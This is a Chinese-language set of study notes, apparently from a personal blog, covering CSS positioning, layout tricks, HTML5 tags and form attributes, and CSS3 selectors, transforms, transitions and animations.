<h4 id="CSS的书写顺序："><a href="#CSS的书写顺序：" class="headerlink" title="CSS的书写顺序："></a>CSS的书写顺序：</h4><ul>
<li>布局定位属性：display&#x2F;position&#x2F;float&#x2F;clear&#x2F;visibility&#x2F;overflow(建议display第一个写，关系到模式)</li>
<li>自身属性：width&#x2F;height&#x2F;margin&#x2F;padding&#x2F;border&#x2F;background</li>
<li>文本属性：color&#x2F;font&#x2F;text-decoration&#x2F;text-align&#x2F;vertical-align&#x2F;white-space&#x2F;break-word</li>
<li>其他属性（CSS3）：content&#x2F;cursor&#x2F;border-radius&#x2F;box-shadow&#x2F;text-shadow&#x2F;background : linear-gradient</li>
</ul>
<h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><ul>
<li>网站首页名字 : <strong>index.html</strong></li>
<li>采取骨架和样式相分离的思想</li>
</ul>
<hr>
<h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><h4 id="为什么需要定位"><a href="#为什么需要定位" class="headerlink" title="为什么需要定位"></a>为什么需要定位</h4><p>-<br>可以让盒子在某个盒子内自由的移动</p>
<p>-<br>或者固定到某个位置上</p>
<p>-<br>可以压住其他盒子</p>
<h4 id="定位的组成"><a href="#定位的组成" class="headerlink" title="定位的组成"></a>定位的组成</h4><p>-<br>定位&#x3D;定位模式+边偏移</p>
<p>-<br>定位模式：指定一个元素在文档中的定位方式</p>
<p>-<br>边偏移：决定了该元素的最终位置</p>
<table>
<thead>
<tr>
<th>值</th>
<th>属性</th>
<th>语义</th>
</tr>
</thead>
<tbody><tr>
<td>static</td>
<td>position</td>
<td>静态定位</td>
</tr>
<tr>
<td>relative</td>
<td>position</td>
<td>相对定位</td>
</tr>
<tr>
<td>absolute</td>
<td>position</td>
<td>绝对定位</td>
</tr>
<tr>
<td>fixed</td>
<td>position</td>
<td>固定定位</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>边偏移属性</th>
<th>实例</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>top</td>
<td>top:80px</td>
<td>顶端偏移量，定义元素相对于其父元素上边线的距离</td>
</tr>
<tr>
<td>bottom</td>
<td>bottom：80px</td>
<td>底部偏移量，定义元素相对于其父元素下边线的距离</td>
</tr>
<tr>
<td>left</td>
<td>left:80px</td>
<td>左侧偏移量，定义元素相对于其父元素左边线的距离</td>
</tr>
<tr>
<td>right</td>
<td>right：80px</td>
<td>右侧偏移量，定义元素相对于其父元素右边线的距离</td>
</tr>
</tbody></table>
<h4 id="静态定位"><a href="#静态定位" class="headerlink" title="静态定位"></a>静态定位</h4><ul>
<li><p>定义 : 元素的默认定位方式 , 没有定位</p>
</li>
<li><p>语法 : <code>选择器:&#123; position: static; &#125;</code></p>
</li>
<li><p>特点</p>
<ul>
<li>没有位偏移</li>
<li>很少用到</li>
</ul>
</li>
</ul>
<h4 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h4><ul>
<li><p>定义 : 是元素在移动位置的时候 , 相对于它原来的位置来说</p>
</li>
<li><p>语法 : <code>选择器:&#123; position : relative; &#125;</code></p>
</li>
<li><p>特点 :</p>
<ul>
<li>移动位置的时候参照点是自己原来的位置</li>
<li>原来在标准的位置依然占有 , 后面的元素不脱标继续占有原位置 , 只有偏移的元素移动</li>
</ul>
</li>
</ul>
<hr>
<h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h4><p>-<br>定义：是元素在移动位置的时候 , 相对于它祖先元素位置来说</p>
<p>-<br>语法 : <code>选择器:&#123; position: absolute; &#125;</code></p>
<p>-<br>特点：</p>
<p>   -<br>如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位（Document文档）。</p>
<p>   -<br>如果祖先元素有定位（相对、绝对、固定定位），则以最近一级的有定位祖先元素为参考点移动位置</p>
<p>   -<br>绝对定位不再占有原先的位置（脱标）</p>
<h4 id="子绝父相的由来"><a href="#子绝父相的由来" class="headerlink" title="子绝父相的由来"></a>子绝父相的由来</h4><ul>
<li><p>定义：子级是绝对定位的话，父级要用相对定位</p>
</li>
<li><p>解释：</p>
<ul>
<li></li>
</ul>
</li>
</ul>
<p>子级绝对定位，不会占有位置，可以放到父盒子里面的任何一个地方，不会影响其他的兄弟盒子</p>
<p>   -<br>父盒子布局时，需要加定位限制子盒子在父盒子内显示</p>
<p>   -<br>父盒子布局时，需要占有位置，因此父亲只能是相对定位</p>
<h4 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h4><p>-<br>定义：是元素固定于浏览器可视区的位置，主要是使用场景：可以在浏览器页面的滚动时元素的位置不会改变</p>
<p>-<br>语法 : <code>选择器:&#123; position: fixed; &#125;</code></p>
<p>-<br>  特点：</p>
<ul>
<li><p>以浏览器的可视窗口为参照点移动元素</p>
</li>
<li><p>跟父元素没有任何关系</p>
</li>
<li><p>不随滚动条滚动</p>
</li>
<li><p>固定定位不再占有原先的位置</p>
</li>
<li><p>固定到版心右侧小技巧：</p>
<ul>
<li>让固定定位的盒子left：50%. 走到浏览器可视区（也可以看成是版心）一半的位置</li>
<li>让固定的盒子margin-left：版心宽度一半距离，多走版心宽度的一半位置</li>
</ul>
</li>
</ul>
<h4 id="粘性定位（了解）"><a href="#粘性定位（了解）" class="headerlink" title="粘性定位（了解）"></a>粘性定位（了解）</h4><ul>
<li><p>被认为是相对定位和固定定位的混合</p>
</li>
<li><p>语法 : <code>选择器:&#123; position: sticky;top:10px &#125;</code></p>
</li>
<li><p>特点：</p>
<ul>
<li>以浏览器的可视窗口为参照点移动元素（固定定位的特点）</li>
<li>粘性定位占有原先的位置（相对定位的特点）</li>
<li>必须添加top,left,right,bottom其中一个才有效</li>
</ul>
</li>
</ul>
<h4 id="定位叠放次序z-index"><a href="#定位叠放次序z-index" class="headerlink" title="定位叠放次序z-index"></a>定位叠放次序z-index</h4><ul>
<li><p>原因：在使用定位布局时，可能会出现盒子重叠的情况，此时，可以使用z-index来控制盒子的前后次序</p>
</li>
<li><p>语法：{z-index:1;}</p>
</li>
<li><p>特别：</p>
<ul>
<li>数值可以是正整数，负整数或者0，默认是auto，数值越大，盒子越靠上</li>
<li>如果属性值相同，则按照书写顺序，后来居上</li>
<li>数字后面不能加单位</li>
<li>只有定位的盒子才有z-index  属性</li>
</ul>
</li>
</ul>
<h4 id="定位的拓展"><a href="#定位的拓展" class="headerlink" title="定位的拓展"></a>定位的拓展</h4><p>-<br>  绝对定位的盒子居中（加了绝对定位的盒子不能通过margin:0 auto水平居中），通过以下方法来实现</p>
<ul>
<li><p>left:50%;  :让盒子左侧移动到父级元素的水平中心位置</p>
</li>
<li><p>margin-left：-100px ; :  让盒子向左移动自身高度的一半</p>
</li>
<li><p>定位的特殊性质：</p>
<ul>
<li>行内元素添加绝对或者固定定位，可以直接设置高度和宽度</li>
<li>块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小</li>
<li>浮动、绝对定位（固定定位都不会触发外边距合并的问题</li>
</ul>
</li>
<li><p>绝对定位（固定定位）会完全压住盒子</p>
<ul>
<li>浮动元素不同，只会压住它下面标准流的盒子，但是不会压住下面标准流盒子里面的文字</li>
<li>绝对定位和（固定定位）会压住下面标准流的所有内容</li>
</ul>
</li>
</ul>
<h4 id="元素的显示与隐藏"><a href="#元素的显示与隐藏" class="headerlink" title="元素的显示与隐藏"></a>元素的显示与隐藏</h4><p>-<br>定义：让一个元素在页面中显示或者隐藏起来</p>
<p>-<br>  语法：</p>
<p>   -<br>     display:</p>
<pre><code>  - `选择器:&#123;display:none;&#125;隐藏对象` (不再占有原先的位置)
  - `选择器:&#123;display:block;&#125;显示元素`
</code></pre>
<p>   -<br>     visibility:</p>
<pre><code>  - `选择器:&#123;visibility:visible;&#125;元素可视`
  - `选择器:&#123;visibility:hidden;&#125;元素隐藏`（继续占有原先的位置）
</code></pre>
<p>   -<br>     overflow:(内容溢出了一个元素的框)，溢出时显示与隐藏</p>
<pre><code>  - 
 注意：如果有定位的盒子，谨慎使用  overflow:hidden   (会隐藏多余的部分)

  - 
</code></pre>
<table>
<thead>
<tr>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>visible</td>
<td>不剪切内容也不添加滚动条</td>
</tr>
<tr>
<td>hidden</td>
<td>不显示超过对象尺寸的内容，超出的那部分隐藏掉</td>
</tr>
<tr>
<td>scroll</td>
<td>不管超出内容否，总是显示滚动条</td>
</tr>
<tr>
<td>auto</td>
<td>超出自动显示滚动条，不超出不显示滚动条</td>
</tr>
</tbody></table>
<h3 id="网页布局总结"><a href="#网页布局总结" class="headerlink" title="网页布局总结"></a>网页布局总结</h3><p>通过盒子模型，清楚知道大部分HTML标签是一个盒子</p>
<p>通过CSS浮动、定位可以让每个盒子排列起来成为网页</p>
<p>-<br>标准流：</p>
<p>-<br>可以让盒子上下排列或者左右排列，垂直的块级盒子显示就用标准流布局</p>
<p>-<br>浮动：</p>
<p>-<br>可以让多个块级元素一行显示或者左右对齐盒子，多个块级盒子水平显示就用浮动布局</p>
<p>-<br>  定位：</p>
<ul>
<li>定位最大的特点是有层叠的概念，就是可以让多个盒子前后压叠来显示，如果元素自由在某个盒子内移动就用定位布局</li>
</ul>
<hr>
<h3 id="CSS高级技巧"><a href="#CSS高级技巧" class="headerlink" title="CSS高级技巧"></a>CSS高级技巧</h3><h4 id="精灵图"><a href="#精灵图" class="headerlink" title="精灵图"></a>精灵图</h4><p>-<br>原因：为了有效地减少服务器接收和发送请求的次数，提高页面的加载速度（CSS Sprites   CSS雪碧）</p>
<p>-<br>核心原理：将网页中的一些很小的小背景图像整合到一张大图中，服务器只需请求一次</p>
<p>-<br>  使用：</p>
<ul>
<li>精灵图主要是针对于小的背景图片来使用</li>
<li>主要借助于背景位置来实现—–background-position.</li>
<li>一般情况下精灵图都是负值（千万要注意网页中的坐标：x轴右边走是正值，左边走是负值，y轴同理）</li>
</ul>
<h4 id="字体图标（iconfont）"><a href="#字体图标（iconfont）" class="headerlink" title="字体图标（iconfont）"></a>字体图标（iconfont）</h4><p>-<br>使用场景：主要用于显示网页中通用的，常用的小图标（展示的是图标，本质属于字体）</p>
<p>-<br>注意：</p>
<p>   -<br>如果遇到一些结构和样式比较简单的小图标就用字体样式</p>
<p>   -<br>如果遇到一些结构和样式复杂一点的小图片就用精灵图</p>
<h4 id="鼠标样式"><a href="#鼠标样式" class="headerlink" title="鼠标样式"></a>鼠标样式</h4><p>-<br>语法：<code>li:&#123; cursor: pointer; &#125;</code></p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>default</td>
<td>小白</td>
</tr>
<tr>
<td>pointer</td>
<td>小手</td>
</tr>
<tr>
<td>move</td>
<td>移动</td>
</tr>
<tr>
<td>text</td>
<td>文本</td>
</tr>
<tr>
<td>not-allowed</td>
<td>禁止</td>
</tr>
</tbody></table>
<h4 id="轮廓线"><a href="#轮廓线" class="headerlink" title="轮廓线"></a>轮廓线</h4><p>-<br>去掉轮廓线：<code>input&#123;outline:none;&#125;</code></p>
<p>-<br>防止拖拽文本域：<code>textarea:resize:none;</code></p>
<h4 id="Vertical-align属性应用"><a href="#Vertical-align属性应用" class="headerlink" title="Vertical-align属性应用"></a>Vertical-align属性应用</h4><p>-<br>使用场景：用于设置图片或者表单（行内块元素）和文字垂直对齐</p>
<p>-<br>语法：<code>vertical-align:baseline | top | middle | bottom;</code></p>
<p>-<br>注意：只针对于行内元素和行内块元素有效</p>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>baseline</td>
<td>默认，元素放置在父元素的基线上</td>
</tr>
<tr>
<td>top</td>
<td>把元素的顶端与行中最高元素的顶端对齐</td>
</tr>
<tr>
<td>middle</td>
<td>把此元素放置在父元素的中部</td>
</tr>
<tr>
<td>bottom</td>
<td>把元素的顶端与行中最低的元素的顶端对齐</td>
</tr>
</tbody></table>
<p>-<br>  解决图片底部默认空白缝隙问题(由于行内块元素会和文字的基线对齐）：</p>
<ul>
<li>给图片添加vertical-align : middle | top | bottom等</li>
<li>把图片转换为块级元素 display: block;</li>
</ul>
<h4 id="溢出的文字省略号显示"><a href="#溢出的文字省略号显示" class="headerlink" title="溢出的文字省略号显示"></a>溢出的文字省略号显示</h4><ul>
<li><p>单行文本溢出显示省略号（满足三个条件）：</p>
<ul>
<li><p>先强制一行内显示文本</p>
<ul>
<li><code>white-space：nowrap;</code>(默认normal自动换行)</li>
</ul>
</li>
<li><p>超出的部分隐藏：</p>
<ul>
<li><code>overflow:hidden;</code></li>
</ul>
</li>
<li><p>文字用省略号替代超出的部分：</p>
<ul>
<li><code>text-overflow:ellipsis;</code></li>
</ul>
</li>
</ul>
</li>
<li><p>多行文本：多行文本溢出显示省略号（了解）</p>
</li>
</ul>
<h4 id="常见的布局技巧"><a href="#常见的布局技巧" class="headerlink" title="常见的布局技巧"></a>常见的布局技巧</h4><p>-<br>  margin负值运用</p>
<ul>
<li><p>让每个盒子margin往左侧移动-1px 正好压住相邻盒子边框</p>
</li>
<li><p>让边框变颜色：</p>
<ul>
<li>鼠标经过某个盒子的时候，提高当前盒子的层级即可(如果没有 定位，则加相对定位（保留i位置），如果有定位，则加z-index提高层级)（有时候边框显示不完整的解决方案）</li>
</ul>
</li>
<li><p>文字围绕浮动元素巧妙运用（用浮动！！！！）</p>
</li>
<li><p>CSS  三角巧妙运用</p>
<ul>
<li>只给盒子设置边框，不要高度和宽度（这里以高一点直角三角形为例）</li>
<li>左边和下边的边框宽度设置为0</li>
<li>只保留右边框有颜色</li>
<li>样式都是solid</li>
<li>上边框宽度要大，右边框 宽度稍小，其余边框设置为0</li>
</ul>
</li>
</ul>
<h2 id="HTML5的新特性"><a href="#HTML5的新特性" class="headerlink" title="HTML5的新特性"></a>HTML5的新特性</h2><h3 id="新增语义化标签："><a href="#新增语义化标签：" class="headerlink" title="新增语义化标签："></a>新增语义化标签：</h3><p>-<br>头部标签：</p>
<p>-<br>导航标签：</p>
<p>-<br>内容标签：</p>
<p>-<br>定义文档某个区域：</p>
<p>-<br>侧边栏标签：</p>
<p>-<br>尾部标签：</p>
<p>-<br>  注意：</p>
<ul>
<li>这些语义化标准主要是针对搜索引擎的</li>
<li>这些新标签页面中可以使用多次</li>
<li>在IE9中，需要把这些元素转换为块级元素</li>
</ul>
<h3 id="新增的多媒体标签："><a href="#新增的多媒体标签：" class="headerlink" title="新增的多媒体标签："></a>新增的多媒体标签：</h3><ul>
<li>视频：</li>
<li>属性：<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>autoplay</td>
<td>autoplay</td>
<td>视频就绪自动播放（谷歌浏览器需要添加muted来解决自动播放问题）</td>
</tr>
<tr>
<td>controls</td>
<td>controls</td>
<td>向用户显示播放控件</td>
</tr>
<tr>
<td>width</td>
<td>width</td>
<td>设置播放器宽度</td>
</tr>
<tr>
<td>height</td>
<td>height</td>
<td>设置播放器高度</td>
</tr>
<tr>
<td>loop</td>
<td>loop</td>
<td>播放完是否继续播放该视频，循环播放</td>
</tr>
<tr>
<td>preload</td>
<td>preload</td>
<td>规定是否预加载视频（如果有了autopaly 就忽略该属性）</td>
</tr>
<tr>
<td>src</td>
<td>src</td>
<td>视频url地址</td>
</tr>
<tr>
<td>poster</td>
<td>poster</td>
<td>加载等待的画面图片</td>
</tr>
<tr>
<td>muted</td>
<td>muted</td>
<td>静音播放</td>
</tr>
</tbody></table>
</li>
</ul>
<p>    注意兼容性!</p>
<p>-<br>音频</p>
<p>-<br>属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>autoplay</td>
<td>autoplay</td>
<td>音频再就绪后马上播放</td>
</tr>
<tr>
<td>controls</td>
<td>controls</td>
<td>向用户显示控件，比如播放按钮</td>
</tr>
<tr>
<td>loop</td>
<td>loop</td>
<td>每当音频结束时重新开始播放</td>
</tr>
<tr>
<td>src</td>
<td>src</td>
<td>要播放的音频的url</td>
</tr>
</tbody></table>
<h3 id="新增的input类型："><a href="#新增的input类型：" class="headerlink" title="新增的input类型："></a>新增的input类型：</h3><p>-<br>举例：</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>type&#x3D;”email”</td>
<td>限制用户输入必须为Email类型</td>
</tr>
<tr>
<td>type&#x3D;”date”</td>
<td>限制用户输入必须为时间类型</td>
</tr>
<tr>
<td>type&#x3D;”tel”</td>
<td>手机号码</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<h3 id="新增表单属性："><a href="#新增表单属性：" class="headerlink" title="新增表单属性："></a>新增表单属性：</h3><ul>
<li>属性：<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>required</td>
<td>required</td>
<td>表单拥有该属性表示其内容不能为空，必填</td>
</tr>
<tr>
<td>placeholder</td>
<td>placeholder</td>
<td>表单的提示信息，存在默认值将不显示</td>
</tr>
<tr>
<td>autofocus</td>
<td>autofocus</td>
<td>自动聚焦属性，页面加载完成自动聚焦到指定表单</td>
</tr>
<tr>
<td>autocomplete</td>
<td>autocomplete</td>
<td>当用户在字段开始键入时，浏览器基于之前键入的值，应该显示出字段中填写的选项。默认已经打开</td>
</tr>
<tr>
<td>multiple</td>
<td>multiple</td>
<td>可以多选文件提交</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="CSS的新特性"><a href="#CSS的新特性" class="headerlink" title="CSS的新特性"></a>CSS的新特性</h2><h3 id="新增选择器"><a href="#新增选择器" class="headerlink" title="新增选择器"></a>新增选择器</h3><h4 id="属性选择器："><a href="#属性选择器：" class="headerlink" title="属性选择器："></a>属性选择器：</h4><p>-<br>属性选择器可以根据元素特定的属性来选择元素</p>
<table>
<thead>
<tr>
<th>选择符</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>E [att]</td>
<td>选择具有att属性的E元素</td>
</tr>
<tr>
<td>E [att&#x3D;”val”]</td>
<td>选择具有att属性且属性值等于val的E元素</td>
</tr>
<tr>
<td>E [att^&#x3D;”val”]</td>
<td>选择具有att属性且属性值以val开头的E元素</td>
</tr>
<tr>
<td>E [att$&#x3D;”val”]</td>
<td>选择具有att属性且属性值以val结尾的E元素</td>
</tr>
<tr>
<td>E [att*&#x3D;”val”]</td>
<td>选择具有att属性且属性值含有val的E元素</td>
</tr>
</tbody></table>
<p>-<br>注：类选择器、属性选择器、伪类选择器，权重为10</p>
<h4 id="结构伪类选择器"><a href="#结构伪类选择器" class="headerlink" title="结构伪类选择器:"></a>结构伪类选择器:</h4><ul>
<li><p>结构伪类选择器主要根据文档结构来选择元素，常用于父级选择器里面的子元素</p>
<table>
<thead>
<tr>
<th>选择符</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>E : first-child</td>
<td>匹配父元素中的第一个子元素E</td>
</tr>
<tr>
<td>E :last-child</td>
<td>匹配父元素中最后一个子元素E</td>
</tr>
<tr>
<td>E : nth-child(n)</td>
<td>匹配父元素中的第n个子元素E</td>
</tr>
<tr>
<td>E : first-of-type</td>
<td>指定类型E的第一个</td>
</tr>
<tr>
<td>E : last-of-type</td>
<td>指定类型E的最后一个</td>
</tr>
<tr>
<td>E : nth-of-type(n)</td>
<td>指定类型E的第n个</td>
</tr>
</tbody></table>
</li>
<li><p>nth-child(n)选择某个父元素的一个或者多个特定的子元素</p>
<ul>
<li>n可以是数字、关键字、和公式</li>
<li>n如果是数字，就是选择第n个子元素，里面数字从1开始</li>
<li>n可以是关键字：even 偶数，odd 奇数</li>
<li>n可以是公式：2n , 2n+1 ,5n ,n+5 ,-n+5</li>
</ul>
</li>
<li><p>nth-child 和nth-of-type的区别</p>
<ul>
<li>nth-child对父元素里面所有的孩子排序选择（序号是固定的），先找到第n个孩子，然后再看看是否匹配</li>
<li>nth-of-type对父元素里面指定的子元素进行排序选择。先去匹配E ，然后再根据E找第n个孩子</li>
</ul>
</li>
</ul>
<h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><ul>
<li><p>优势：帮助我们利用CSS创建新标签元素，不需要HTML标签，简化了HTML结构</p>
</li>
<li><p>语法：</p>
<ul>
<li><code>element：：before&#123;&#125;</code>  在元素内部的前面插入内容</li>
<li>    <code>element：：after&#123;&#125;</code>  在元素内部的后面插入内容</li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>before和after创建一个元素，但是属于行内元素</li>
<li>新创建的这个元素在文档树中是找不到的，所以我们称为伪元素</li>
<li>before和after必须有content属性</li>
<li>before在父元素内容的前面创建元素，after在父元素内容的后面插入元素</li>
<li>伪元素选择器和标签选择器一样，权重为1</li>
</ul>
</li>
<li><p>伪元素消除浮动</p>
</li>
</ul>
<h3 id="CSS3盒子模型："><a href="#CSS3盒子模型：" class="headerlink" title="CSS3盒子模型："></a>CSS3盒子模型：</h3><h4 id="新增特性"><a href="#新增特性" class="headerlink" title="新增特性"></a>新增特性</h4><p>-<br>  指定盒模型：box-sizing : border-box</p>
<ul>
<li><p>这样padding和border-box就不会撑开盒子（前提是padding和border不会超过width宽度</p>
</li>
<li><p>滤镜filter:将图形模糊或者颜色偏移</p>
<ul>
<li>语法：<code>filter：blur(5px);</code>  blur模糊处理，数值越大越模糊</li>
</ul>
</li>
<li><p>calc() : 不用固定死子盒子，执行计算后使用该值</p>
<ul>
<li>语法：<code>width:calc(100%-80px);</code>  (括号里面的值均可以使用+，-，*，&#x2F;的值)</li>
</ul>
</li>
</ul>
<h4 id="CSS过渡"><a href="#CSS过渡" class="headerlink" title="CSS过渡"></a>CSS过渡</h4><ul>
<li>语法：<code>transition: 要过渡的属性 花费时间 运动曲线 何时开始</code></li>
<li>口诀：是做过渡给谁加</li>
</ul>
<h3 id="CSS-转换"><a href="#CSS-转换" class="headerlink" title="CSS  转换"></a>CSS  转换</h3><ul>
<li>转换(transform)：位移、旋转、缩放等</li>
</ul>
<h4 id="2D-转换："><a href="#2D-转换：" class="headerlink" title="2D 转换："></a>2D 转换：</h4><h5 id="移动："><a href="#移动：" class="headerlink" title="移动："></a>移动：</h5><p>-<br>移动：translate(可以改变元素在页面中的位置，类似定位)</p>
<p>-<br>语法：<code>transform:translate(x,y)或者分开写</code></p>
<p>                          <code>transform:translateX(n);</code></p>
<p>                          <code>transform:translateY(n);</code></p>
<p>-<br>重点：</p>
<p>   -<br>沿着X和Y轴移动位置</p>
<p>   -<br>优点：不会影响到其他元素的位置</p>
<p>   -<br>translate中的百分比单位是相对于自身元素的translate：（50%,50%);</p>
<p>   -<br>对行内标签没有效果</p>
<h5 id="旋转："><a href="#旋转：" class="headerlink" title="旋转："></a>旋转：</h5><p>-<br>旋转：让元素在2维平面顺时针旋转或者逆时针旋转</p>
<p>-<br>语法：<code>transform:rotate(度数)</code></p>
<p>-<br>  重点：</p>
<ul>
<li><p>rotate里面跟单位，单位是deg,</p>
</li>
<li><p>角度为正时，顺时针，负时逆时针</p>
</li>
<li><p>默认旋转的中心点是元素的中心点</p>
</li>
<li><p>转换中心点：</p>
<ul>
<li>语法：<code>transform-origin:x y;</code></li>
<li>注意后面的参数x 和y用空格隔开</li>
<li>x  y  默认转换的中心点是元素的中心点（50% 50%）</li>
<li>还可以给x   y  设置像素或者方位名词（top  bottom left  right  center)</li>
</ul>
</li>
</ul>
<h5 id="缩放："><a href="#缩放：" class="headerlink" title="缩放："></a>缩放：</h5><ul>
<li><p>定义：放大或者缩小盒子</p>
</li>
<li><p>语法：<code>transform：scale(x,y);</code></p>
</li>
<li><p>注意：</p>
<ul>
<li>里面的x,y要用逗号隔开</li>
<li>transform : scale(2,2): 底和高都放大了2倍，为1相当于没有放大</li>
<li>transform : scale(2):只写一个参数，相当于底和高等比例放大或者缩小</li>
<li>transform : scale(0.5):缩小</li>
<li>scale优势：可以设置转换中心点缩放，默认以中心点缩放的，不影响其他的盒子</li>
</ul>
</li>
</ul>
<h5 id="综合注意："><a href="#综合注意：" class="headerlink" title="综合注意："></a>综合注意：</h5><ul>
<li>同时使用多个转换，其格式为<code>transform:translate() rotato() scale()</code>等</li>
<li>其顺序会影响转换的效果，先旋转会改变坐标轴的位置</li>
<li>当我们同时有位移和其他属性的时候，记得将位移放在最前面</li>
</ul>
<h4 id="3D转换"><a href="#3D转换" class="headerlink" title="3D转换"></a>3D转换</h4><h5 id="三维坐标系"><a href="#三维坐标系" class="headerlink" title="三维坐标系"></a>三维坐标系</h5><ul>
<li>x轴：水平向右（右边是正值，左边是负值）</li>
<li>y轴：垂直向下（y下面是正值，上面是负值）</li>
<li>z轴：垂直屏幕（往外是正值，往里面是负值）</li>
</ul>
<h5 id="3D位移"><a href="#3D位移" class="headerlink" title="3D位移"></a>3D位移</h5><ul>
<li>语法：<code>transform3d:translate(x,y，z)或者分开写</code> xyz是不能省略的，没有就写0</li>
</ul>
<p>                          <code>transform:translateX(n);</code></p>
<p>                          <code>transform:translateY(n);</code></p>
<p>                          <code>transform:translateZ(n);</code>   沿着Z轴移动，向外或者向内移动</p>
<h5 id="透视："><a href="#透视：" class="headerlink" title="透视："></a>透视：</h5><ul>
<li>透视也叫视距，人的眼睛到屏幕的距离（视觉点越近，成像越大；近小越大）</li>
<li>透视写在被观察元素的父盒子里面（z轴越大，我们看到的物体就越大）</li>
<li>语法：    <code>perspective: 500px; transform:translateZ(100px)</code></li>
</ul>
<h5 id="3D旋转"><a href="#3D旋转" class="headerlink" title="3D旋转"></a>3D旋转</h5><ul>
<li>语法：：<code>transform:rotateX(度数)</code>：沿着X轴正方向旋转</li>
</ul>
<p>                      <code>transform:rotateY(度数)</code>：沿着y轴正方向旋转</p>
<p>                      <code>transform:rotateZ(度数)</code>:沿着z轴正方向旋转</p>
<p>                    <code>transform:rotate3D(x,y,z,deg)</code>  沿着自定义轴旋转deg（了解）</p>
<ul>
<li><p>左手准则：</p>
<ul>
<li>左手拇指指向x轴的正方向</li>
<li>其余手指的弯曲方向就是该元素沿着x轴旋转的方向</li>
</ul>
</li>
</ul>
<h4 id="3D呈现"><a href="#3D呈现" class="headerlink" title="3D呈现"></a>3D呈现</h4><ul>
<li>定义：控制盒子是否开启三维立体环境</li>
<li>语法：    <code>transform-style:preserve-3d</code>;</li>
<li>注意：代码写给父级，但是影响的是子盒子</li>
</ul>
<h3 id="背景线性渐变"><a href="#背景线性渐变" class="headerlink" title="背景线性渐变"></a>背景线性渐变</h3><ul>
<li><p>背景渐变必须添加浏览器私有前缀</p>
</li>
<li><p>语法：</p>
<ul>
<li><code>-webkit-linear-gradient(起始方向,颜色1,颜色2，……)</code>;</li>
<li><code>-webkit-linear-gradient(left,red,blue)</code>;</li>
</ul>
</li>
</ul>
<h3 id="CSS3-动画："><a href="#CSS3-动画：" class="headerlink" title="CSS3 动画："></a>CSS3 动画：</h3><h4 id="动画的基本使用："><a href="#动画的基本使用：" class="headerlink" title="动画的基本使用："></a>动画的基本使用：</h4><p>-<br>动画序列:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@keyframes 动画名称&#123;</span><br><span class="line">	0%&#123;</span><br><span class="line">		width：100px;</span><br><span class="line">	&#125;</span><br><span class="line">	100%&#123;</span><br><span class="line">		width:200px;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>-<br>先定义动画再调用动画</p>
<p>-<br>  注意点：</p>
<ul>
<li><p>可以做多个状态的变化 keyframe 关键帧</p>
</li>
<li><p>里面的百分比要是整数</p>
</li>
<li><p>里面的百分比就是总的时间 的划分</p>
</li>
<li><p>属性：动画名称&#x2F;持续时间&#x2F;运动曲线&#x2F;何时开始&#x2F;重复次数等等…</p>
</li>
<li><p>动画的简写属性：</p>
<ul>
<li>animation:动画名称  持续时间  何时开始  播放次数  是否反方向  动画起始或者结束的状态</li>
<li><code>animation:name duration timing-function iteration-count direction fill-mode;</code></li>
<li>前面两个属性不能省</li>
<li>简写属性里面不包含animation-play-state</li>
<li>暂停动画：animation-play-state: paused;经常和鼠标经过等其他配合使用</li>
<li>想要动画走回来，而不是直接跳回来：animation-direction ： alternate</li>
<li>盒子动画结束后，停在结束位置： animation-fill-mode ：forwards</li>
</ul>
</li>
</ul>
<h5 id="速度曲线细节"><a href="#速度曲线细节" class="headerlink" title="速度曲线细节"></a>速度曲线细节</h5><ul>
<li>语法：<code>animation-timing-function:ease</code><table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>linear</td>
<td>动画从头到尾的速度是相同的，匀速</td>
</tr>
<tr>
<td>ease</td>
<td>默认，动画以低速开始，然后加快，在结束前变慢</td>
</tr>
<tr>
<td>ease-in</td>
<td>动画以低速开始</td>
</tr>
<tr>
<td>ease-out</td>
<td>动画以低速结束</td>
</tr>
<tr>
<td>ease-in-out</td>
<td>动画以低速开始和结束</td>
</tr>
<tr>
<td>steps</td>
<td>指定了时间函数中的间隔数量，就是分几步完成</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="私有前缀"><a href="#私有前缀" class="headerlink" title="私有前缀"></a>私有前缀</h3><ul>
<li>低版本的兼容性</li>
</ul>
<h2 id="项目规划"><a href="#项目规划" class="headerlink" title="项目规划"></a>项目规划</h2><p>- </p>
<h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><p>![](C:\Users\xiaoxiao\Pictures\Saved Pictures\1.jpg)</p>
<p>- </p>
